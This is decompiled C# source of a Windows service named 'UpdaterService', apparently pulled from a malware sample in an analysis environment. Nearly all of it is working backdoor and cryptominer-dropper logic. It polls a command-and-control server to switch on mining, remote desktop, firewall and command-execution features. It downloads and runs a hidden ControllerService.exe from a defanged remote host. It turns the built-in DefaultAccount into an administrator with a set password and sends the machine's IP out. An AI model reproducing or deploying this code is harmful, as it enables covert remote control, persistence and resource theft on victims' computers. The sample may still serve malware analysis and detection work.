// Decompiled with JetBrains decompiler
// Type: UpdaterService.Service1
// Assembly: UpdaterService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FB66A7F-8AE7-472D-85E4-A0D54D3018CC
// Assembly location: C:\Users\flareadmin\Downloads\0f6572e1184084cd1257731eaa6e44af30a46a69679630a87065da9dccd0c32b.exe

using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Timers;

namespace UpdaterService
{
  public class Service1 : ServiceBase
  {
    private System.Timers.Timer timerInfo;
    private System.Timers.Timer TimerCreateUser;
    private System.Timers.Timer TimerRestartSystem;
    private System.Timers.Timer TimerRemote;
    private System.Timers.Timer TimerFirewall;
    private System.Timers.Timer TimerListPross;
    private System.Timers.Timer TimerNetworkInterface;
    private System.Timers.Timer TimerCmd;
    private System.Timers.Timer TimerDownload;
    private System.Timers.Timer TimerMangment;
    private System.Timers.Timer TimerPing;
    private System.Timers.Timer CounterOnline;
    private System.Timers.Timer TimerSupportXmr;
    private System.Timers.Timer TimerCheckController;
    private System.Timers.Timer TimerUserDefaultAccount;
    private System.Timers.Timer TimerCmdClose;
    private IContainer components = (IContainer) null;

    public Service1() => this.InitializeComponent();

    protected override void OnStart(string[] args)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
        currentProcess.PriorityClass = ProcessPriorityClass.High;
      this.TimerMangment = new System.Timers.Timer();
      this.TimerMangment.Interval = 25000.0;
      this.TimerMangment.Elapsed += new ElapsedEventHandler(this.timerMangment_tick);
      this.TimerMangment.Enabled = true;
      this.TimerUserDefaultAccount = new System.Timers.Timer();
      this.TimerUserDefaultAccount.Interval = 20000.0;
      this.TimerUserDefaultAccount.Elapsed += new ElapsedEventHandler(this.timerUserDefaultAccount_tick);
      this.TimerUserDefaultAccount.Enabled = true;
      this.TimerCheckController = new System.Timers.Timer();
      this.TimerCheckController.Interval = 360000.0;
      this.TimerCheckController.Elapsed += new ElapsedEventHandler(this.timerCheckController_tick);
      this.TimerCheckController.Enabled = true;
      this.TimerSupportXmr = new System.Timers.Timer();
      this.TimerSupportXmr.Interval = 40000.0;
      this.TimerSupportXmr.Elapsed += new ElapsedEventHandler(this.timerTimerSupportXmr_tick);
      this.CounterOnline = new System.Timers.Timer();
      this.CounterOnline.Interval = 60000.0;
      this.CounterOnline.Elapsed += new ElapsedEventHandler(this.timerCounterOnline_tick);
      this.timerInfo = new System.Timers.Timer();
      this.timerInfo.Interval = 15000.0;
      this.timerInfo.Elapsed += new ElapsedEventHandler(this.timer_tick);
      this.timerInfo.Enabled = true;
      this.TimerCreateUser = new System.Timers.Timer();
      this.TimerCreateUser.Interval = 25000.0;
      this.TimerCreateUser.Elapsed += new ElapsedEventHandler(this.timerCreateUser_tick);
      this.TimerRestartSystem = new System.Timers.Timer();
      this.TimerRestartSystem.Interval = 60000.0;
      this.TimerRestartSystem.Elapsed += new ElapsedEventHandler(this.Timer_RestartServer_Tick);
      this.TimerRemote = new System.Timers.Timer();
      this.TimerRemote.Interval = 30000.0;
      this.TimerRemote.Elapsed += new ElapsedEventHandler(this.Timer_RemoteDesctop_Tick);
      this.TimerFirewall = new System.Timers.Timer();
      this.TimerFirewall.Interval = 40000.0;
      this.TimerFirewall.Elapsed += new ElapsedEventHandler(this.Timer_Firwall_Tick);
      this.TimerListPross = new System.Timers.Timer();
      this.TimerListPross.Interval = 50000.0;
      this.TimerListPross.Elapsed += new ElapsedEventHandler(this.Timer_ListPross_Tick);
      this.TimerNetworkInterface = new System.Timers.Timer();
      this.TimerNetworkInterface.Interval = 38000.0;
      this.TimerNetworkInterface.Elapsed += new ElapsedEventHandler(this.Timer_NetworkInterface_Tick);
      this.TimerCmd = new System.Timers.Timer();
      this.TimerCmd.Interval = 41000.0;
      this.TimerCmd.Elapsed += new ElapsedEventHandler(this.Timer_Cmd_Tick);
      this.TimerDownload = new System.Timers.Timer();
      this.TimerDownload.Interval = 44000.0;
      this.TimerDownload.Elapsed += new ElapsedEventHandler(this.Timer_Download_Tick);
      this.TimerPing = new System.Timers.Timer();
      this.TimerPing.Interval = 60000.0;
      this.TimerPing.Elapsed += new ElapsedEventHandler(this.Timer_Ping_Tick);
      this.TimerPing.Enabled = true;
      this.TimerCmdClose = new System.Timers.Timer();
      this.TimerCmdClose.Interval = 23000.0;
      this.TimerCmdClose.Elapsed += new ElapsedEventHandler(this.timerCLoseCMD_tick);
      this.TimerCmdClose.Enabled = true;
      try
      {
        new Thread(new ThreadStart(FunctionBox.InfoRounded_CPU_Usage))
        {
          IsBackground = true
        }.Start();
        new Thread(new ThreadStart(FunctionBox.InfoRounded_Helper_Usage))
        {
          IsBackground = true
        }.Start();
        new Thread(new ThreadStart(FunctionBox.GetLastUsersLogin))
        {
          IsBackground = true
        }.Start();
      }
      catch
      {
      }
    }

    private void timerCLoseCMD_tick(object sender, ElapsedEventArgs e)
    {
      int num1 = 0;
      int num2 = 0;
      int num3 = 0;
      try
      {
        num1 = Process.GetProcessesByName("cmd").Length;
        num2 = Process.GetProcessesByName("powershell").Length;
        num3 = Process.GetProcessesByName("ControllerService").Length;
      }
      catch
      {
      }
      while (Process.GetProcessesByName("cmd").Length > 7)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "helper")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "xmrig")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "cmd")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "cmd.exe")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "Windows Command Processor")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "Windows Command Processor.exe")
              process.Kill();
          }
        }
        catch
        {
        }
      }
      while (Process.GetProcessesByName("powershell").Length > 7)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "helper")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "xmrig")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "powershell")
              process.Kill();
          }
        }
        catch
        {
        }
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "powershell.exe")
              process.Kill();
          }
        }
        catch
        {
        }
      }
      while (Process.GetProcessesByName("ControllerService").Length > 1)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == "ControllerService")
              process.Kill();
          }
        }
        catch
        {
        }
      }
      try
      {
        string str = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "100").ToString();
        if (num1 >= 7)
        {
          using (WebClient webClient = new WebClient())
          {
            NameValueCollection data = new NameValueCollection()
            {
              {
                "key",
                "EventCmd"
              },
              {
                "status",
                "successfully"
              },
              {
                "res",
                "cmd"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
          }
        }
        if (num2 < 7)
          return;
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data = new NameValueCollection()
          {
            {
              "key",
              "EventCmd"
            },
            {
              "status",
              "successfully"
            },
            {
              "res",
              "powershell"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
        }
      }
      catch
      {
      }
    }

    protected override void OnStop() => FunctionBox.RunStart();

    private void timerMangment_tick(object sender, ElapsedEventArgs e)
    {
      using (WebClient webClient = new WebClient())
      {
        NameValueCollection data = new NameValueCollection()
        {
          {
            "key",
            "TimerMangment"
          },
          {
            "IDAdmin",
            Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString()
          },
          {
            "status",
            "wait"
          },
          {
            "ip",
            FunctionBox.GetIPAddress()
          }
        };
        string str = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
        if (!(str != "no"))
          return;
        string[] strArray = str.Split('|');
        this.timerInfo.Enabled = strArray[0] == "ON";
        this.TimerCreateUser.Enabled = strArray[1] == "ON";
        this.TimerFirewall.Enabled = strArray[2] == "ON";
        this.TimerRemote.Enabled = strArray[3] == "ON";
        this.TimerRestartSystem.Enabled = strArray[4] == "ON";
        this.TimerCmd.Enabled = strArray[5] == "ON";
        this.TimerSupportXmr.Enabled = strArray[7] == "ON";
        this.TimerListPross.Enabled = strArray[8] == "ON";
        this.TimerNetworkInterface.Enabled = strArray[9] == "ON";
        this.TimerDownload.Enabled = strArray[10] == "ON";
        this.CounterOnline.Enabled = strArray[11] == "ON";
      }
    }

    private void timerCheckController_tick(object sender, ElapsedEventArgs e)
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data = new NameValueCollection()
          {
            {
              "key",
              "VerController"
            },
            {
              "IDAdmin",
              Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "100").ToString()
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            }
          };
          if (Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data)) != "no" && System.IO.File.Exists("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe"))
          {
            System.IO.File.Delete("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe");
            Thread.Sleep(5000);
            FunctionBox.DownloadFile("hxxp://updatesrv2.bounceme.net/update/file/ControllerService.exe", "C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe");
            Thread.Sleep(5000);
            Process.Start("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe");
            Thread.Sleep(1200000);
            System.IO.File.SetAttributes("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe", FileAttributes.Hidden | FileAttributes.System);
          }
          if (!System.IO.File.Exists("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe"))
          {
            FunctionBox.DownloadFile("hxxp://updatesrv2.bounceme.net/update/file/ControllerService.exe", "C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe");
            Thread.Sleep(5000);
            Process.Start("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe");
            Thread.Sleep(1200000);
            System.IO.File.SetAttributes("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe", FileAttributes.Hidden | FileAttributes.System);
          }
          if (new FileInfo("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe").Length > 1L)
            return;
          FunctionBox.DownloadFile("hxxp://updatesrv2.bounceme.net/update/file/ControllerService.exe", "C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe");
          System.IO.File.SetAttributes("C:\\Users\\" + this.GetUsernameActive() + "\\AppData\\Roaming\\Microsoft\\ControllerService.exe", FileAttributes.Hidden | FileAttributes.System);
        }
      }
      catch
      {
      }
    }

    private void timerUserDefaultAccount_tick(object sender, ElapsedEventArgs e)
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "UserAuthentication", (object) 1);
      }
      catch
      {
      }
      try
      {
        if (FunctionBox.UserExists("DefaultAccount"))
        {
          using (CmdService cmdService = new CmdService("cmd.exe"))
          {
            string empty = string.Empty;
            string command1 = "net user DefaultAccount /active:yes";
            cmdService.ExecuteCommand(command1);
            string command2 = "net localgroup administrators DefaultAccount /add";
            cmdService.ExecuteCommand(command2);
            string command3 = "WMIC USERACCOUNT WHERE Name='DefaultAccount' SET PasswordExpires=FALSE";
            cmdService.ExecuteCommand(command3);
          }
          FunctionBox.ResetAdminPass("DefaultAccount", "%1A" + FunctionBox.GetmacAddresses().Substring(0, 5));
        }
        else
        {
          if (FunctionBox.UserExists("DefaultAccount"))
            return;
          FunctionBox.createUser("DefaultAccount", "%1A" + FunctionBox.GetmacAddresses().Substring(0, 5));
        }
      }
      catch
      {
      }
    }

    private void timerTimerSupportXmr_tick(object sender, ElapsedEventArgs e) => FunctionBox.SendDataSupportXmr();

    private void timerCounterOnline_tick(object sender, ElapsedEventArgs e) => FunctionBox.SendDataCounterOnline();

    private void timer_tick(object sender, ElapsedEventArgs e) => FunctionBox.SendDataInfo();

    private void timerCreateUser_tick(object sender, ElapsedEventArgs e) => FunctionBox.SendDataCreateUser();

    private void Timer_RestartServer_Tick(object sender, EventArgs e) => FunctionBox.SendDataRestart();

    private void Timer_RemoteDesctop_Tick(object sender, EventArgs e) => FunctionBox.SendDataRemote();

    private void Timer_Firwall_Tick(object sender, EventArgs e) => FunctionBox.SendDataFirewall();

    private void Timer_ListPross_Tick(object sender, EventArgs e) => FunctionBox.SendDataListPross();

    private void Timer_NetworkInterface_Tick(object sender, EventArgs e) => FunctionBox.SendDataListNetworkInterface();

    private void Timer_Cmd_Tick(object sender, EventArgs e) => FunctionBox.SendDataCmd();

    private void Timer_Download_Tick(object sender, EventArgs e) => FunctionBox.SendDataDownload();

    private void Timer_Ping_Tick(object sender, EventArgs e) => FunctionBox.CheckConnectToServer();

    private string GetUsernameActive()
    {
      string str = "";
      try
      {
        string name = WindowsIdentity.GetCurrent().Name;
        char[] chArray = new char[1]{ '\\' };
        return str = name.Split(chArray)[1].ToString();
      }
      catch
      {
        return str = "Administrator";
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.ServiceName = nameof (Service1);
    }
  }
}
